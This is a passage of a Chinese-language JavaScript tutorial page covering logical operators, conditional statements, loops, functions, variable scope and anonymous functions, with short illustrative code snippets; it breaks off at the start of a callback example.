<h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>概述：在 JS 语言当中是有逻辑运算符（逻辑操作符）。</p>
<p>逻辑运算符一共三个：逻辑与 &amp;&amp;、逻辑或 |、逻辑非 ！。</p>
<p>在 JS 当中一般情况下布尔值参与逻辑运算，但是其他的类型的数值也可以参与逻辑运算，只不过浏览器中的解析器会将其他类型的数据‘隐式转换’为布尔类型数据参与逻辑运算。</p>
<h3 id="布尔类型数值参与运算"><a href="#布尔类型数值参与运算" class="headerlink" title="布尔类型数值参与运算"></a>布尔类型数值参与运算</h3><h4 id="逻辑与"><a href="#逻辑与" class="headerlink" title="逻辑与"></a>逻辑与</h4><p>概述：当两者（AB）同时为真（true），返回的结果才为真（true）。否则即为假（false）</p>
<p>语法格式：A&amp;&amp;B</p>
<h4 id="逻辑或"><a href="#逻辑或" class="headerlink" title="逻辑或"></a>逻辑或</h4><p>概述：当两者有一个为真（true），返回结果即为真（true）。否则为假（false）</p>
<p>语法格式：A||B</p>
<h4 id="逻辑非"><a href="#逻辑非" class="headerlink" title="逻辑非"></a>逻辑非</h4><p>概述：置反</p>
<p>逻辑非运算符可以同时多个出现，例如：!!!true 即为 false</p>
<h3 id="其他类型数据参与"><a href="#其他类型数据参与" class="headerlink" title="其他类型数据参与"></a>其他类型数据参与</h3><p>概述：在 JS 语言当中，其他类型数据（数字、字符串、未定义、空对象）也可以参与逻辑运算。</p>
<p>像这种非正常现象，返回结果可能不是布尔值。是由于其他类型数据参与逻辑运算的时候，浏览器中解析器会自动的将这些数据隐士转换为布尔值参与。</p>
<p>数字类型 -&gt; 布尔值</p>
<p>数字类型 -&gt; 布尔值</p>
<table>
<thead>
<tr>
<th align="center">数字类型的数值</th>
<th align="center">布尔值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0、NaN</td>
<td align="center">false</td>
</tr>
<tr>
<td align="center">其余的数字</td>
<td align="center">true</td>
</tr>
</tbody></table>
<p>字符串 -&gt; 布尔值</p>
<table>
<thead>
<tr>
<th align="center">字符串类型数值</th>
<th align="center">布尔值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">空字符串</td>
<td align="center">false</td>
</tr>
<tr>
<td align="center">非空字符串</td>
<td align="center">true</td>
</tr>
</tbody></table>
<p>undefined -&gt; 布尔值</p>
<table>
<thead>
<tr>
<th align="center">未定义类型数值</th>
<th align="center">布尔值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">undefined</td>
<td align="center">false</td>
</tr>
</tbody></table>
<p>空对象 -&gt; 布尔值</p>
<table>
<thead>
<tr>
<th align="center">空对象类型数值</th>
<th align="center">布尔值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">null</td>
<td align="center">false</td>
</tr>
</tbody></table>
<ul>
<li><p>其他类型数据参与逻辑运算的时候，其实浏览器底层也是通过 Boolean 内置函数实现自动隐式转换为布尔值参与的。</p>
</li>
<li><p>其他运算符也可以和逻辑运算符一起使用</p>
</li>
</ul>
<h2 id="流程控制语句"><a href="#流程控制语句" class="headerlink" title="流程控制语句"></a>流程控制语句</h2><h3 id="if-条件语句"><a href="#if-条件语句" class="headerlink" title="if 条件语句"></a>if 条件语句</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>在 JS 语言当中，是有所谓流程控制语句。流程控制语句：条件语句、循环语句。</p>
<p>条件语句：程序中如果出现一种、或者多种情况要进行选择的时候，只能选择某一个符合条件的分支去</p>
<p>执行，这样的语句，称之为条件语句。</p>
<h4 id="if-条件语句的基本使用"><a href="#if-条件语句的基本使用" class="headerlink" title="if 条件语句的基本使用"></a>if 条件语句的基本使用</h4><p>语法格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    if()&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>if 条件语句是由关键字 if 开头，后面紧随一个小括号。</p>
</li>
<li><p>小括号里面放置条件：条件一般需要的是布尔值、其他类型数值、运算符计算完结果</p>
</li>
<li><p>小括号后面紧随大花括号（结构体），结构体里面可以书写代码。</p>
</li>
<li><p>如果条件为真，条件语句结构体才会执行。如果条件为假，条件语句结构体不会执行。</p>
</li>
</ul>
<h4 id="else-关键字"><a href="#else-关键字" class="headerlink" title="else 关键字"></a>else 关键字</h4><p>关键字 else 可以结合 if 条件语句一起使用</p>
<p>语法格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>()&#123;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>关键字 else 可以结合 if 条件语句一起使用。不是必须的。</p>
</li>
<li><p>else 关键字的这个分支，其实是有暗含条件。暗含条件是对于上面分支的条件进行否定。</p>
</li>
</ul>
<p>实例：</p>
<p>让学生输入自己分数，对应弹出及格、挂科。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> score = <span class="built_in">parseInt</span>(<span class="title function_">prompt</span>(<span class="string">&quot;请输入你的分数&quot;</span>));</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span> (score&gt;<span class="number">60</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(<span class="string">&quot;恭喜你，你通过了&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        alert (<span class="string">&quot;你没有及格哦&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="多分支-if-条件语句"><a href="#多分支-if-条件语句" class="headerlink" title="多分支 if 条件语句"></a>多分支 if 条件语句</h4><p>概述：多分支 if 条件语句，它是if条件语句升级版。可以在多种情况下，选择某一个符合条件的分支去执行。</p>
<p>语法格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">if</span>()&#123;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>()&#123;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>()&#123;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">else</span>&#123;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="if-条件语句嵌套使用"><a href="#if-条件语句嵌套使用" class="headerlink" title="if 条件语句嵌套使用"></a>if 条件语句嵌套使用</h4><p>概述：if 条件语句中结构体内部可以书写任意代码。甚至还可以在内部在书写一个条件语句。</p>
<p>特别注意：如果嵌套在内部条件语句执行，内外条件语句都要符合条件才可以执行。</p>
<h3 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h3><p>概述：我们已经学习很多运算符：数学运算符、比较运算符、逻辑运算符。初次之外，JS 当中还有赋值运算符。</p>
<p>赋值运算符：经常给变量进行赋值。</p>
<p>赋值运算符： &#x3D; 、 +&#x3D;、-&#x3D;、*&#x3D;、&#x2F;&#x3D;、%&#x3D;</p>
<h3 id="switch-条件语句"><a href="#switch-条件语句" class="headerlink" title="switch 条件语句"></a>switch 条件语句</h3><p>switch：开关 </p>
<p>case：条件、情况 </p>
<p>break：终止、打破 </p>
<p>default：对于其余分支进行否定，使用的时候功能近似 else。</p>
<p>概述：在 JS 当中是有所谓流程控制语句：条件语句 + 循环语句。</p>
<p>条件语句：if 条件语句、switch 条件语句。if 条件语句能做的，switch 条件语句也可以做。</p>
<p>语法格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">switch</span>(条件)&#123;</span></span><br><span class="line"><span class="language-javascript">    	<span class="keyword">case</span> 条件<span class="number">1</span>:</span></span><br><span class="line"><span class="language-javascript">			语句<span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">case</span> 条件<span class="number">2</span>:</span></span><br><span class="line"><span class="language-javascript">			语句<span class="number">2</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">default</span>:</span></span><br><span class="line"><span class="language-javascript">			语句<span class="number">3</span>;</span></span><br><span class="line"><span class="language-javascript">        	<span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>switch 条件语句中小括号里面：布尔值，变量，表达式等。</p>
</li>
<li><p>case 关键字后面紧随的是判断条件，判断条件为真执行分支，判断条件为假不执行分支。</p>
</li>
<li><p>break 关键字，他的作用是终止条件语句。若没有 break 语句，则会自动执行紧连着的下面的条件语句。</p>
</li>
</ul>
<h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><p>概述：在 JS 这门语言当中，是有所谓流程控制语句。流程控制语句是由 <code>条件语句+循环语句</code> 组成。</p>
<p>条件语句：在一种、多种条件下，选择某一个符合条件分支进行执行。</p>
<p>循环语句：在程序当中，出现了大量重复性的语句的时候，可以利用循环语句进行解决。</p>
<h4 id="for-循环语句"><a href="#for-循环语句" class="headerlink" title="for 循环语句"></a>for 循环语句</h4><p>语法格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">    for(定义变量;设置条件;变量操作)&#123;</span><br><span class="line">        循环体;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>案例：在控制台输出5次“今天是个好天气”</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;今天是个好天气&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ol>
<li><p>经常用来声明一个或者多个变量，一般情况下都是有初始值的。（循环语句第一步只是执行一次）</p>
</li>
<li><p>经常用来进行条件判断(需要的是布尔值)，如果条件为真，会执行循环语句第三步、第四步。如果条件为假的，立即终止循环语句。</p>
</li>
<li><p>也称之为循环语句，循环体。这里面经常书写大量重复性的代码。</p>
</li>
<li><p>经常用来给第一步声明的变量进行重新赋值。</p>
</li>
</ol>
<h4 id="for-循环语句其他书写方式"><a href="#for-循环语句其他书写方式" class="headerlink" title="for 循环语句其他书写方式"></a>for 循环语句其他书写方式</h4><p>第一种方式：省略第二步的条件判断，不建议这样书写，因为循环语句第二部没有书写判断条件，默认数值为布尔值真，会导致“死循环”</p>
<p>第二种方式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">5</span>; k &lt; <span class="number">10</span>; k+=<span class="number">3</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(k);<span class="comment">//5、8</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>循环语句第四步，经常给变量进行重新赋值，这步当中可以使用任意赋值运算符。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">1</span> , t = <span class="number">9</span>; k + t &lt; <span class="number">20</span>; t+=<span class="number">5</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(t);<span class="comment">//9、14</span></span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="关键字细究"><a href="#关键字细究" class="headerlink" title="关键字细究"></a>关键字细究</h5><h6 id="break"><a href="#break" class="headerlink" title="break"></a>break</h6><p>概述：关键字 break，也可以结合循环语句一起使用。它的作用是立刻终止循环语句。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">1</span>;i&lt;<span class="number">10</span>;i++)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(i == <span class="number">4</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(i);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>i 的值为 4 时停止循环语句，所以打印出来的只有 1~3。</p>
<h6 id="continue"><a href="#continue" class="headerlink" title="continue"></a>continue</h6><p>概述：关键字 continue，也可以结合循环语句一起使用。它主要的作用是：立刻终止当前这一次循环，然后去执行循环语句的下一次循环。</p>
<p>例如：将上面的代码中的 break 换成 continue 之后，只是 i&#x3D;4 的这一次循环被终止，后面的循环还是在继续</p>
<h4 id="while-循环语句基本使用"><a href="#while-循环语句基本使用" class="headerlink" title="while 循环语句基本使用"></a>while 循环语句基本使用</h4><p>概述：while 也属于循环语句，他的作用也是可以处理大量重复性出现语句。</p>
<p>注意：有的人管 for、while 循环语句，称之为“前测试循环语句”。</p>
<p>前测试循环语句：先进行条件判断，再执行循环体。</p>
<p>语法格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">while</span>(条件)&#123;</span></span><br><span class="line"><span class="language-javascript">    循环体</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>while 循环语句：小括号里面放置的是循环语句判断条件【一般需要布尔值、其他类型数据（隐式转换）、表达式】</p>
</li>
<li><p>当循环语句的判断条件为真，循环体才会执行。否则循环体不会执行。</p>
</li>
</ul>
<h4 id="do-while-语句"><a href="#do-while-语句" class="headerlink" title="do-while 语句"></a>do-while 语句</h4><p>概述：do-while 也属于 JS 当中循环语句。它的作用也是可以解决大量重复性问题。</p>
<p>do-while 循环语句属于后测试循环语句。</p>
<p>后测试循环语句：先执行循环体，在进行循环条件判断。</p>
<p>注意：由于 do-while 后测试循环语句（先执行循环体、后进行条件判断）：循环体至少执行一次。</p>
<p>语法格式：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">do</span>&#123;</span></span><br><span class="line"><span class="language-javascript">    循环体</span></span><br><span class="line"><span class="language-javascript">    &#125;<span class="keyword">while</span>(判断条件);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>注：该循环语句会先执行循环体在判断条件是否符合</p>
<h4 id="穷举思想"><a href="#穷举思想" class="headerlink" title="穷举思想"></a>穷举思想</h4><p>我们可以将题目的全部的情况一一验证，根据题目要求将符合条件的情况作为结果输出。</p>
<p>比如：请你输出 1~100 之间偶数。（偶数：就是可以被 2 整除的数字）</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">for</span>(<span class="keyword">var</span> num=<span class="number">1</span>;num&lt;=<span class="number">100</span>;num++)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">if</span>(num%<span class="number">2</span>==<span class="number">0</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="variable language_">console</span>.<span class="title function_">log</span>(num+<span class="string">&quot;是偶数&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="循环语句嵌套使用"><a href="#循环语句嵌套使用" class="headerlink" title="循环语句嵌套使用"></a>循环语句嵌套使用</h4><p>概述：在 JS 语言当中，我们可以通过 <code>循环+条件语句</code> 实现穷举思想。除此之外循环语句也可以嵌套使用。</p>
<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>function：函数、功能。</p>
<p>概述：</p>
<p>函数你可以理解为将某一个常用的功能进行封装。当你想使用这个功能的时候，可以选择调用、执行这个功能即可。</p>
<p>注意：JavaScript 脚本语言当中，函数分为两种：一种关键字 function 定义函数、一种是表达式形式函数。</p>
<p>函数使用分为两部分：声明、调用</p>
<p>举例子：在前面我们学习很多内置函数 alert、prompt。</p>
<p>alert：将警告框功能进行封装，当我们想使用这个功能的时候，调用、执行这个功能。</p>
<p>prompt：将提示框功能进行分装，当我们想使用这个功能的时候，调用、执行这个功能。</p>
<h3 id="关键字形式函数"><a href="#关键字形式函数" class="headerlink" title="关键字形式函数"></a>关键字形式函数</h3><p>概述：在 JS 这门语言当中，函数有两种形式：第一种关键字形式函数，关键字形式函数，需要通过关键字 function 进行声明、定义。</p>
<p>基本语法：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//声明部分</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		...</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//调用部分</span></span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">fun</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>函数使用分为两部分：声明、调用（可以多次调用这个功能）</p>
</li>
<li><p>函数在 JS 当中属于 Object 引用类型数据，不是 Function 类型的（因为 JS 语言当中没有这个类型）</p>
</li>
<li><p>函数如果只是声明、但是没有调用。函数体里面代码不会自行的。</p>
</li>
</ul>
<h3 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h3><p>概述：形参（形式参数）、实参（实际参数）</p>
<p>在函数声明的时候，声明部分的小括号里面可以书写形参。</p>
<p>在函数调用的时候，调用时候传递数据称之为实参。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a,b</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(a,b);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">add</span>(<span class="string">&quot;你好&quot;</span>,<span class="string">&quot;哇&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>声明函数时，括号里面的称之为形式参数，多个形参之间用逗号隔开。</p>
</li>
<li><p>调用函数时，括号里面的称为实际参数 ，多个实参之间用逗号隔开，实参可以是任意类型的数据。</p>
</li>
<li><p>注意：用户调用函数的时候，会将实参按照顺序依次赋值给形参。</p>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a,b</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(a,b);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>); <span class="comment">// 1 2</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">add</span>(<span class="number">1</span>); <span class="comment">// 1 undefined</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">add</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>); <span class="comment">// 1 2</span></span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">add</span>(<span class="literal">false</span>,[]); <span class="comment">// false []</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>形参个数不能决定实参个数。实参个数也不能决定形参个数。</li>
</ul>
<h3 id="变量-1"><a href="#变量-1" class="headerlink" title="变量"></a>变量</h3><p>概述：变量，变量你可以理解为是一个容器，可以承载任意类型的字面数值或者计算完结果。</p>
<p>通过访问变量名字，就可以获取到变量存储数据。</p>
<p>变量：在 JS 当中变量分为两种：局部变量、全局变量。</p>
<h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>在 JS 当中局部变量，只有两种情况：</p>
<ol>
<li>作为函数形参 </li>
<li>变量在函数体中声明</li>
</ol>
<p>局部变量<strong>只能</strong>在函数体中使用。</p>
<h4 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h4><p>除了局部变量以外的都是全局变量。</p>
<p>全局变量，可以在 JS 行为层中任意地方使用。</p>
<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">add</span>(<span class="params">a,b</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> test = <span class="number">10</span>;</span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(a,b);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">add</span>(a,b);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">add</span>(test,test)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时会报错</p>
<h3 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h3><p>scope：作用域</p>
<p>概述：作用域可以理解为是书写代码的范围。</p>
<p>全局作用域：书写在 JS 代码范围最大的两个 script 标签之间。</p>
<p>函数拥有作用域：函数的作用域即为函数体（函数作用域是在全局作用域当中的）。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="comment">//全局变量</span></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> count = <span class="number">666</span>;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">fun</span> ()&#123; <span class="comment">//函数体内部没有找到count，于是去函数体外找到全局变量count</span></span></span><br><span class="line"><span class="language-javascript">		<span class="variable language_">console</span>.<span class="title function_">log</span>(count);</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="title function_">fun</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>由于函数作用域没有局部变量 count，因此会沿着作用域向上查找（等等，我找找我家老大看看他有没有）</p>
</li>
<li><p>全局作用域中有全局变量 count，此时函数作用域会“借来”使用一下。</p>
</li>
</ul>
<h3 id="关键字-return"><a href="#关键字-return" class="headerlink" title="关键字 return"></a>关键字 return</h3><p>概述：关键字 return 一般结合函数一起使用。而且需要注意，这个关键字一般只能在函数体中使用。</p>
<p>这个关键字的作用是两个：</p>
<ol>
<li>函数体中如果遇见关键字 return，函数体中后面语句不再执行。</li>
<li>函数体中关键字可以将计算结果返回，使函数体外部可以获取到函数返回结果。</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">function</span> <span class="title function_">fun</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">var</span> num=<span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">return</span> num;</span></span><br><span class="line"><span class="language-javascript">	&#125;</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">var</span> sum = <span class="title function_">fun</span>();</span></span><br><span class="line"><span class="language-javascript">	<span class="variable language_">console</span>.<span class="title function_">log</span>(sum); <span class="comment">//100</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h3><p>在 JavaScript 中，匿名函数是没有名字的函数。它们可以在需要函数但不需要函数名时使用，这常见于回调涵数、立即执行函数表达式（IIFE），以及作为参数传递给其他函数。匿名函数的一个主要好处是它可以帮助减少全局命名冲突并提供更加紧凑的代码语法。</p>
<h4 id="匿名函数的创建和使用"><a href="#匿名函数的创建和使用" class="headerlink" title="匿名函数的创建和使用"></a>匿名函数的创建和使用</h4><p>匿名函数可以通过函数表达式来创建，而不是通过函数声明。下面是一个匿名函数的例子：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> example = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, world!&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里，我们创建了一个匿名函数，并将其赋值给变量 <code>example</code>。虽然这个函数没有名字，但我们可以通过变量 <code>example</code> 来引用和调用它。</p>
<h4 id="作为回调函数"><a href="#作为回调函数" class="headerlink" title="作为回调函数"></a>作为回调函数</h4><p>匿名函数经常被用作回调函数，传递给其他函数或方法。例如，在数组的 <code>.forEach</code> 方法中：</p>
